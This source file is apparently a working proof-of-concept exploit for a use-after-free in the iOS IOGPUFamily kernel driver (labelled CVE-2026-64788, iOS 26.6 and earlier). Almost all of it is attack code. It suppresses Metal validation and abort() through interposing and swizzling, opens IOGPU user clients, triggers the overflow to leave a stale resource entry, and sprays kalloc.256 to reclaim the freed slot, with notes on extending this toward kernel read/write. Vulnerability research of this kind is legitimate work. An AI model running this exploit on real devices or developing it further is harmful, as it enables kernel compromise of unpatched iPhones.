/*
 * CVE-2026-64788 — IOGPUFamily Use-After-Free PoC
 *
 * Root cause: IOGPUDevice::create_resource_iosurface allocates an IOGPUSysMemory
 * object (~0x100 bytes, kalloc.256), registers it in the device's resource table,
 * then runs a dimension overflow check (ADDS width+height → b.hs carry).  The
 * overflow branch returns kIOReturnInvalid WITHOUT releasing the object — leaving
 * a stale, live entry in the resource table pointing to freed memory.
 *
 * UAF dereference: IOGPUDevice::set_resource_purgeable calls get_resource_by_id()
 * on the stale ID, finds the dangling entry, and accesses it non-vtably:
 *
 *   @0x010c: ldaddl w9(-4), w8, [stale+0x24]   atomic decrement; w8 = old value
 *   @0x0128: cbz w8, skip → if old!=0: ldr x1,[stale+0x28] → IOGPUMemory::setAllocation
 *   @0x0134: ldr x0,[stale+0x10] → IOCommandGate arg; cbz → skip if 0
 *
 * Safe PoC spray payload (no kernel pointer needed):
 *   spray[0x10] = 0  → skips Call3 (IOCommandGate)
 *   spray[0x24] = 0  → old value = 0 → skips Call2 (setAllocation)
 *   spray[0x28] = 0  → not reached
 *
 * Detection: set_resource_purgeable on a nonexistent ID returns 0xe00002c2.
 * After the UAF + spray, the stale ID returns 0xe0002be (resource found, Call1
 * fired) — the return code change confirms attacker-controlled heap was processed.
 *
 * Trigger: Metal's -[MTLDevice newTextureWithDescriptor:iosurface:plane:] sends
 * the XPC to the GPU daemon → create_resource_iosurface in kernel.  The 1×65535
 * IOSurface path packs (height<<16)|width into args[0x08] and height into
 * args[0x0a], causing ADDS(0xFFFF0001, 0xFFFF) → carry in the kernel.
 *
 * iOS 26 zone sequestration note:
 *   Freed IOGPUSysMemory stays in a type-stable zone free list.  [stale+0x10] and
 *   [stale+0x18] retain live objects (IOMemoryDescriptor, IOGPUDevice) so Call2
 *   and Call3 always execute on valid ivars — a kernel r/w primitive requires a
 *   secondary primitive to break zone sequestration on iOS 26+.
 *
 * Affected: iOS / iPadOS 26.6 (23G71) and earlier.
 * Fixed in: iOS / iPadOS 26.6.1 (23G83).
 */

#import <Metal/Metal.h>
#import <IOSurface/IOSurfaceRef.h>
#import <IOKit/IOKitLib.h>
#import <objc/runtime.h>
#include "exploit.h"
#include <stdarg.h>

/* The PoC's printf goes nowhere in a LiveContainer guest (stdout is not the
   app log). Route every PoC line through nk_log so it reaches the UI console
   and trace.log, with the [uaf] tag preserved. */
static void poc_printf(const char *fmt, ...) {
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    /* strip trailing newlines — nk_log adds its own framing */
    size_t n = strlen(buf);
    while (n && (buf[n-1] == '\n' || buf[n-1] == '\r')) buf[--n] = 0;
    nk_log("%s", buf);
}
#define printf(...) poc_printf(__VA_ARGS__)

#include <stdio.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <mach/mach.h>
#include <signal.h>
#include <setjmp.h>
#include <dlfcn.h>

/* ── IOConnectTrap2: raw via asm alias (SDK marks it unavailable on iOS) ── */
typedef kern_return_t (*IOConnectTrap2_f)(io_connect_t, uint32_t, uintptr_t, uintptr_t);
static IOConnectTrap2_f g_trap2 = NULL;

static void load_trap2(void) {
    g_trap2 = (IOConnectTrap2_f)dlsym(RTLD_DEFAULT, "IOConnectTrap2");
    if (!g_trap2) {
        void *h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit",
                         RTLD_LAZY | RTLD_NOLOAD);
        if (h) g_trap2 = (IOConnectTrap2_f)dlsym(h, "IOConnectTrap2");
    }
}

/* ── DYLD_INTERPOSE macro ─────────────────────────────────────────────────
 * Patches all callers of the target function across all loaded images at
 * dyld load time, before __DATA_CONST is made read-only.               */
#define DYLD_INTERPOSE(_new, _old)                                           \
    __attribute__((used))                                                    \
    static struct { const void *new_fn; const void *old_fn; }               \
    _interpose_##_old                                                        \
    __attribute__((section("__DATA,__interpose"), aligned(sizeof(void *)))) \
    = { (const void *)(&(_new)), (const void *)(&(_old)) }

/* ── Hook: _mtlValidateStrideTextureParameters ────────────────────────────
 * Suppresses the Metal stride-validation abort so overflow dimensions reach
 * the GPU daemon and propagate to the kernel's create_resource_iosurface.  */
static volatile int g_suppress_stride = 0;

extern void _mtlValidateStrideTextureParameters(void);
static void hook_mtlValidateStrideTextureParameters(void) {
    if (g_suppress_stride)
        printf("[hook-stride] suppressed — overflow dims continuing to XPC\n");
}
DYLD_INTERPOSE(hook_mtlValidateStrideTextureParameters,
               _mtlValidateStrideTextureParameters);

/* ── Hook: abort() ────────────────────────────────────────────────────────
 * Intercepts abort() calls from Metal's validation path during the exploit
 * window.  Outside that window, re-raises SIGABRT normally.              */
static volatile int g_suppress_abort = 0;

static void hook_abort(void) {
    if (g_suppress_abort) {
        printf("[hook-abort] suppressed inside exploit window\n");
        return;
    }
    raise(SIGABRT);
    raise(SIGABRT);
}
DYLD_INTERPOSE(hook_abort, abort);

/* ── SIGTRAP: skip BRK after noreturn abort() ────────────────────────────
 * Compiler emits `BRK #0x1` after noreturn calls on arm64e.  When
 * hook_abort() returns, the BRK fires SIGTRAP.  Advance PC by 4.        */
static void sigtrap_handler(int sig, siginfo_t *info, void *ctx) {
    (void)sig; (void)info;
    if (!g_suppress_abort) return;
    ucontext_t *uc = (ucontext_t *)ctx;
    uint64_t pc = (uint64_t)arm_thread_state64_get_pc(uc->uc_mcontext->__ss);
    void (*next)(void) = (void (*)(void))(uintptr_t)(pc + 4);
    arm_thread_state64_set_pc_fptr(uc->uc_mcontext->__ss, next);
}

/* ── No-op NSAssertionHandler ────────────────────────────────────────────
 * Metal's IOGPUMetalTexture asserts valid dims before the XPC dispatch.
 * Installing this on the caller thread lets execution continue.          */
@interface _PocAssertHandler : NSAssertionHandler @end
@implementation _PocAssertHandler
- (void)handleFailureInMethod:(SEL)sel object:(id)obj
                         file:(NSString *)f lineNumber:(NSInteger)l
                  description:(NSString *)fmt, ... {
    printf("[assert-bypass] -[%s %s]:%ld\n",
           class_getName([obj class]), sel_getName(sel), (long)l);
}
- (void)handleFailureInFunction:(NSString *)fn
                           file:(NSString *)f lineNumber:(NSInteger)l
                    description:(NSString *)fmt, ... {
    printf("[assert-bypass] %s:%ld\n", fn.UTF8String, (long)l);
}
@end

/* ── Metal validation bypass ─────────────────────────────────────────────
 * Swizzles MTLTextureDescriptorInternal validateWithDevice: and
 * IOGPUMetalTexture's init to no-ops so overflow dims reach the kernel.  */
static void bypass_metal_validation(void) {
    /* Swizzle descriptor validator */
    Class cls = objc_getClass("MTLTextureDescriptorInternal");
    if (!cls) cls = objc_getClass("_MTLTextureDescriptorInternal");
    if (cls) {
        SEL s = NSSelectorFromString(@"validateWithDevice:");
        Method m = class_getInstanceMethod(cls, s);
        if (!m) { s = NSSelectorFromString(@"validate"); m = class_getInstanceMethod(cls, s); }
        if (m) {
            method_setImplementation(m, imp_implementationWithBlock(
                ^(__unused id _s, __unused id _d) { }));
            printf("[+] MTLTextureDescriptorInternal validation no-op installed\n");
        }
    }

    /* Install no-op assertion handler on this thread */
    [[NSThread currentThread] threadDictionary][NSAssertionHandlerKey]
        = [[_PocAssertHandler alloc] init];

    printf("[+] Metal validation bypass complete\n");
}

/* ── Spray kalloc.256 with controlled payload ────────────────────────────
 * 0x300 MTLBuffer(0x100) fills the freed IOGPUSysMemory slot.
 * Payload zeros [+0x10] and [+0x24] so Call2 and Call3 are skipped safely. */
#define SPRAY_COUNT  0x300
#define SPRAY_SZ     0x100

static NSMutableArray<id<MTLBuffer>> *spray_buffers(id<MTLDevice> dev) {
    NSMutableArray *arr = [NSMutableArray arrayWithCapacity:SPRAY_COUNT];
    for (int i = 0; i < SPRAY_COUNT; i++) {
        id<MTLBuffer> buf = [dev newBufferWithLength:SPRAY_SZ
                                            options:MTLResourceStorageModeShared];
        if (!buf) { printf("[!] spray alloc failed at i=%d\n", i); break; }
        memset(buf.contents, 0, SPRAY_SZ);   /* zeros [+0x10],[+0x24],[+0x28] */
        [arr addObject:buf];
    }
    printf("[+] sprayed %u × 0x%x-byte buffers (kalloc.256)\n",
           (unsigned)arr.count, SPRAY_SZ);
    return arr;
}

/* ── Locate Metal's io_connect_t by scanning the MTLDevice object ─────── */
/* Direct open of the IOGPU user clients. The PoC's port-scan heuristic
   (find_resource_conn) failed on A15/26.2: on this GPU generation the
   resource connection is not reachable from the list of the app's own
   send rights (it belongs to the GPU daemon's team), so the scan never
   sees it. IOServiceOpen with the IOGPU device types bypasses that limit
   entirely — type 1 = IOGPUDeviceUserClient (the s_new_resource /
   set_resource_purgeable surface), type 5 = the variant used by wh1te4ever's
   24257 PoC. */
static io_connect_t open_gpu_conn(void) {
    io_connect_t conn = MACH_PORT_NULL;
    io_service_t svc = IOServiceGetMatchingService(
        kIOMasterPortDefault, IOServiceMatching("IOGPU"));
    if (!svc) {
        printf("[conn] IOServiceGetMatchingService(IOGPU) = 0\n");
        return MACH_PORT_NULL;
    }
    printf("[conn] IOGPU service matched\n");
    for (uint32_t t = 1; t <= 33; t++) {
        conn = MACH_PORT_NULL;
        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), t, &conn);
        if (kr == KERN_SUCCESS && conn) {
            printf("[conn] type=%u OPENED conn=0x%x\n", t, conn);
            return conn;
        }
        if (t <= 6 || t == 33) {
            printf("[conn] type=%u kr=0x%x\n", t, kr);
        }
    }
    return MACH_PORT_NULL;
}

static io_connect_t find_resource_conn(id<MTLDevice> dev) {
    /* Walk all send-rights in our task, probe each with IOConnectTrap2(sel=3)
     * using a dummy resource_id=1.  The GPU resource connection returns
     * something other than kIOReturnUnsupported.                            */
    if (!g_trap2) return MACH_PORT_NULL;

    mach_port_name_array_t names = NULL;
    mach_port_type_array_t types = NULL;
    mach_msg_type_number_t ncnt  = 0, tcnt = 0;
    if (mach_port_names(mach_task_self(), &names, &ncnt, &types, &tcnt) != KERN_SUCCESS)
        return MACH_PORT_NULL;

    io_connect_t found = MACH_PORT_NULL;
    for (mach_msg_type_number_t i = 0; i < ncnt && found == MACH_PORT_NULL; i++) {
        if (!(types[i] & MACH_PORT_TYPE_SEND)) continue;
        mach_port_name_t p = names[i];
        if (p < 0x100 || p > 0xFFFF) continue;

        /* IOConnectTrap2 sel=3: set_resource_purgeable(id=1, state=0).
         * Real resource conn → non-kIOReturnUnsupported (0xe00002c2 = not found,
         * or 0xe0002be = processed). Other ports → 0xe00002be or KERN_FAILURE. */
        kern_return_t kr = g_trap2((io_connect_t)p, 3, 1, 0);
        printf("[find-conn] port=0x%x type=0x%x kr=0x%x\n", p, types[i], kr);
        if (kr != (kern_return_t)0xe00002c2 && kr != (kern_return_t)KERN_FAILURE &&
            kr != (kern_return_t)0x10000003 /* MACH_SEND_INVALID_DEST */) {
            found = (io_connect_t)p;
        }
    }
    if (!found) printf("[find-conn] scan done: ports=%u — no resource conn visible\n", ncnt);
    vm_deallocate(mach_task_self(), (vm_address_t)names,
                  ncnt * sizeof(mach_port_name_t));
    vm_deallocate(mach_task_self(), (vm_address_t)types,
                  tcnt * sizeof(mach_port_type_t));
    return found;
}

/* ── Baseline scan: find a stale resource ID ─────────────────────────────
 * Before planting the UAF, call set_resource_purgeable for IDs 1..128.
 * All should return 0xe00002c2 (resource not found).                      */
static uint32_t baseline_scan(io_connect_t conn) {
    kern_return_t baseline = (kern_return_t)0xe00002c2; /* resource-not-found */
    for (uint32_t id = 1; id <= 128; id++) {
        kern_return_t kr = g_trap2(conn, 3, id, 0);
        if (kr != baseline) {
            printf("[baseline] unexpected kr=0x%x for id=%u\n", kr, id);
        }
    }
    printf("[baseline] scan complete — all IDs return 0xe00002c2\n");
    return 0;
}

/* ── Plant the UAF via a 1×65535 IOSurface ───────────────────────────────
 * Height (0xFFFF) + width (1) fits in a uint16 but their sum (0x10000)
 * overflows uint32 when packed as (height<<16)|width in the kernel's ADDS
 * check, triggering the missing-release bug.                               */
static uint32_t plant_uaf(id<MTLDevice> dev, io_connect_t conn) {
    /* Create 1×65535 IOSurface */
    NSDictionary *props = @{
        (id)kIOSurfaceWidth:            @(1),
        (id)kIOSurfaceHeight:           @(0xFFFF),
        (id)kIOSurfaceBytesPerElement:  @(4),
        (id)kIOSurfacePixelFormat:      @(0x42475241), /* kCVPixelFormatType_32BGRA */
    };
    IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    if (!surf) {
        printf("[!] IOSurfaceCreate failed\n");
        return 0;
    }
    printf("[uaf] IOSurface %p: %lux%lu\n", (void*)surf,
           (unsigned long)IOSurfaceGetWidth(surf),
           (unsigned long)IOSurfaceGetHeight(surf));

    /* MTLTextureDescriptor with overflow dims */
    MTLTextureDescriptor *desc = [MTLTextureDescriptor new];
    desc.textureType    = MTLTextureType2D;
    desc.pixelFormat    = MTLPixelFormatBGRA8Unorm;
    desc.width          = 1;
    desc.height         = 0xFFFF;
    desc.mipmapLevelCount = 1;
    desc.usage          = MTLTextureUsageShaderRead;

    /* Arm suppression hooks */
    g_suppress_abort  = 1;
    g_suppress_stride = 1;

    printf("[uaf] creating overflow texture (1x65535) → create_resource_iosurface\n");
    id<MTLTexture> tex = [dev newTextureWithDescriptor:desc iosurface:surf plane:0];
    printf("[uaf] newTextureWithDescriptor returned: %p\n", (__bridge void*)tex);

    g_suppress_abort  = 0;
    g_suppress_stride = 0;

    CFRelease(surf);

    /* Probe IDs 1..4096 for the stale entry. 23C55 registers IOSurface
       resources under higher IDs than the 26.6 shape the original PoC was
       written against, so 1..128 can miss the entry entirely. */
    kern_return_t baseline = (kern_return_t)0xe00002c2;
    uint32_t oks = 0, other = 0;
    for (uint32_t id = 1; id <= 4096; id++) {
        kern_return_t kr = g_trap2(conn, 3, id, 0);
        if (kr == baseline) continue;
        if (kr == (kern_return_t)0xe00002be) { oks++; if (oks <= 8) printf("[uaf] id=%u kr=0xe0002be (processed)\n", id); continue; }
        other++;
        if (other <= 8) printf("[uaf] id=%u kr=0x%x\n", id, kr);
        if (kr != (kern_return_t)0xe00002be) { printf("[uaf] stale_id=%u kr=0x%x <- candidate\n", id, kr); return id; }
    }
    printf("[uaf] sweep 1..4096: processed=%u other=%u — no stale ID\n", oks, other);

    /* 2) trap2 selector probe: which selectors does this conn actually speak?
       Enumerate 0..63 and log every distinct answer so we can find the real
       purgeable/get-resource surface on 23C55 (the PoC assumes trap sel=3). */
    printf("[sel] enumerating trap selectors 0..63\n");
    for (uint32_t sel = 0; sel < 64; sel++) {
        kern_return_t kr = g_trap2(conn, sel, 1, 0);
        if (kr != (kern_return_t)0xe00002c2 && kr != (kern_return_t)KERN_FAILURE &&
            kr != (kern_return_t)0x10000003) {
            printf("[sel] sel=%u kr=0x%x\n", sel, kr);
        }
    }
    printf("[!] no stale ID found — create_resource_iosurface may not have fired\n");
    return 0;
}

/* ── Confirm UAF: set_resource_purgeable on stale_id after spray ──────── */
static void confirm_uaf(io_connect_t conn, uint32_t stale_id,
                        NSArray<id<MTLBuffer>> *spray) {
    (void)spray; /* retained by caller; its heap memory is in the freed slot */

    kern_return_t kr = g_trap2(conn, 3, stale_id, 0);
    printf("\n[confirm] set_resource_purgeable(stale_id=%u) → kr=0x%x\n",
           stale_id, kr);

    if (kr == (kern_return_t)0xe0002be) {
        printf("[CONFIRMED] UAF: stale entry processed with attacker-controlled heap\n");
        printf("  Call1 fired: ldaddl on spray[0x24] (was 0, now -4)\n");
        printf("  Call2 skipped: old spray[0x24] was 0\n");
        printf("  Call3 skipped: spray[0x10] = 0\n");
    } else if (kr == (kern_return_t)0xe00002c2) {
        printf("[-] resource not found — spray may not have reclaimed the slot\n");
        printf("    Try increasing SPRAY_COUNT or adjusting spray timing\n");
    } else {
        printf("[?] kr=0x%x — unexpected response\n", kr);
    }
}

/* ── Entry point ─────────────────────────────────────────────────────────*/
int poc_iogpu_uaf_run(void) {
    printf("=== CVE-2026-64788: IOGPUFamily UAF PoC ===\n");
    printf("Target: iOS 26.6 (23G71) — A14 Bionic (iPhone 12)\n\n");

    printf("[+] poc start: pid=%d\n", getpid());
    load_trap2();
    if (!g_trap2) {
        printf("[!] IOConnectTrap2 not found via dlsym — falling back to direct symbol\n");
        g_trap2 = (IOConnectTrap2_f)IOConnectTrap2;   /* link-time symbol */
        if (!g_trap2) {
            printf("[!] IOConnectTrap2 unavailable — cannot run PoC\n");
            return 1;
        }
    }
    printf("[+] trap2=%p\n", (void*)(uintptr_t)g_trap2);

    /* SIGTRAP handler for BRK after suppressed abort() */
    struct sigaction sa = {};
    sa.sa_sigaction = sigtrap_handler;
    sa.sa_flags     = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGTRAP, &sa, NULL);

    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) { printf("[!] no Metal device\n"); return 1; }
    printf("[+] Metal device: %s\n", dev.name.UTF8String);

    bypass_metal_validation();

    io_connect_t conn = find_resource_conn(dev);
    if (conn == MACH_PORT_NULL) {
        printf("[conn] port scan failed — falling back to direct IOServiceOpen\n");
        conn = open_gpu_conn();
    }
    if (conn == MACH_PORT_NULL) {
        printf("[!] could not locate GPU resource connection\n");
        return 1;
    }
    printf("[+] resource conn=0x%x\n", conn);

    baseline_scan(conn);

    uint32_t stale_id = plant_uaf(dev, conn);
    if (!stale_id) return 1;

    printf("\n[+] UAF planted (stale_id=%u). Spraying 0x%x kalloc.256 buffers...\n",
           stale_id, SPRAY_COUNT);
    NSArray *spray = spray_buffers(dev);

    confirm_uaf(conn, stale_id, spray);

    printf("\n=== PoC complete ===\n");
    return 0;
}


/* Native bridge wrapper: the srk801 console capture reads the process stdout,
   so the PoC's printf output lands in the app log and trace.log alike. */
void nk_iogpu_uaf_run(void) {
    int r = poc_iogpu_uaf_run();
    nk_log("[iogpu-uaf] poc exit=%d", r);
}
